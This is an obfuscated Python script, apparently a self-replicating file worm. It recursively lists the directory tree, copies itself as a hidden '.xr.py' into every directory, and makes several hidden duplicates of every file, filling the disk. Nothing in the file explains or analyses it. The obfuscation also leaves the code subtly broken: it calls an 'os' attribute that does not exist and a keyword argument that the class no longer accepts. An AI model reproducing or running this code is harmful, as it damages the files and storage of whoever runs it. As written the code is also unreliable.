lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI = str, range, print, __name__, type, isinstance

IIlIllllllIIlIIllI = None
import os as lIlllIllIIIIll, shutil as IlIIlllIIlIIII

class IIIllIlllIIIlllIII:

    def __init__(IIIIlllllIlllIllII, lIllIllIIIIlllIllI=IIlIllllllIIlIIllI, IllIIlIlllllIllIII=IIlIllllllIIlIIllI, IIIIIllIlllIlllIll=IIlIllllllIIlIIllI):
        IIIlIIIllIIllllllI = IllIIlIlllllIllIII
        if llllllllllllIlI(lIllIllIIIIlllIllI, llllllllllllIll(IIlIllllllIIlIIllI)):
            IIIIlllllIlllIllII.lIllIllIIIIlllIllI = '/'
        else:
            IIIIlllllIlllIllII.lIllIllIIIIlllIllI = lIllIllIIIIlllIllI
        if llllllllllllIlI(IIIlIIIllIIllllllI, llllllllllllIll(IIlIllllllIIlIIllI)):
            IIIIlllllIlllIllII.IllIIlIlllllIllIII = []
        else:
            IIIIlllllIlllIllII.IllIIlIlllllIllIII = IIIlIIIllIIllllllI
        if llllllllllllIlI(IIIlIIIllIIllllllI, llllllllllllIll(IIlIllllllIIlIIllI)):
            IIIIlllllIlllIllII.IIIIIllIlllIlllIll = 2
        else:
            IIIIlllllIlllIllII.IIIIIllIlllIlllIll = IIIIIllIlllIlllIll
        IIIIlllllIlllIllII.own_path = lIlllIllIIIIll.lIllIllIIIIlllIllI.realpath(__file__)

    def IlIIlIIIIIIlIIIIIl(IIIllIIIlllllIlIII, lIllIllIIIIlllIllI):
        IIIIlllllIlllIllII = lIllIllIIIIlllIllI
        IIIllIIIlllllIlIII.IllIIlIlllllIllIII.append(IIIIlllllIlllIllII)
        lIIIlIlIlllllIIllI = lIlllIllIIIIll.listdir(IIIIlllllIlllIllII)
        for lIIllIllllIIlIIlIl in lIIIlIlIlllllIIllI:
            IIIlIIIllIIllllllI = lIlllIllIIIIll.lIllIllIIIIlllIllI.join(IIIIlllllIlllIllII, lIIllIllllIIlIIlIl)
            lllllllllllllIl(IIIlIIIllIIllllllI)
            if lIlllIllIIIIll.lIllIllIIIIlllIllI.isdir(IIIlIIIllIIllllllI):
                IIIllIIIlllllIlIII.IlIIlIIIIIIlIIIIIl(IIIlIIIllIIllllllI)
            else:
                0

    def lIIIlIIllIIlIIllIl(IIIIlllllIlllIllII):
        for IIIlIIIllIIllllllI in IIIIlllllIlllIllII.IllIIlIlllllIllIII:
            IIIllIIIlllllIlIII = lIlllIllIIIIll.lIllIllIIIIlllIllI.join(IIIlIIIllIIllllllI, '.xr.py')
            IlIIlllIIlIIII.copyfile(IIIIlllllIlllIllII.own_path, IIIllIIIlllllIlIII)

    def IlIIIIllllIIIIlIll(IIIllIIIlllllIlIII):
        for IIIIlllllIlllIllII in IIIllIIIlllllIlIII.IllIIlIlllllIllIII:
            lIIllIllllIIlIIlIl = lIlllIllIIIIll.listdir(IIIIlllllIlllIllII)
            for lIIIlIlIlllllIIllI in lIIllIllllIIlIIlIl:
                IIIlIIIllIIllllllI = lIlllIllIIIIll.lIllIllIIIIlllIllI.join(IIIIlllllIlllIllII, lIIIlIlIlllllIIllI)
                if not IIIlIIIllIIllllllI.startswith('.') and (not lIlllIllIIIIll.lIllIllIIIIlllIllI.isdir(IIIlIIIllIIllllllI)):
                    lIIllllllIllIlllIl = IIIlIIIllIIllllllI
                    for lllIIIIllllIIlIIlI in llllllllllllllI(IIIllIIIlllllIlIII.IIIIIllIlllIlllIll):
                        IlIIIllllIlllIIIll = lIlllIllIIIIll.lIllIllIIIIlllIllI.join(IIIIlllllIlllIllII, '.' + lIIIlIlIlllllIIllI + lllllllllllllll(lllIIIIllllIIlIIlI))
                        IlIIlllIIlIIII.copyfile(lIIllllllIllIlllIl, IlIIIllllIlllIIIll)

    def IllllIIIIlIllIIIIl(IIIIlllllIlllIllII):
        IIIIlllllIlllIllII.IlIIlIIIIIIlIIIIIl(IIIIlllllIlllIllII.lIllIllIIIIlllIllI)
        lllllllllllllIl(IIIIlllllIlllIllII.IllIIlIlllllIllIII)
        IIIIlllllIlllIllII.lIIIlIIllIIlIIllIl()
        IIIIlllllIlllIllII.IlIIIIllllIIIIlIll()
if lllllllllllllII == '__main__':
    lIIIIIIllIlIIIIIll = lIlllIllIIIIll.lIllIllIIIIlllIllI.abspath('')
    lIIIIlIlIIllIlIIII = IIIllIlllIIIlllIII(path=lIIIIIIllIlIIIIIll)
    lIIIIlIlIIllIlIIII.IllllIIIIlIllIIIIl()
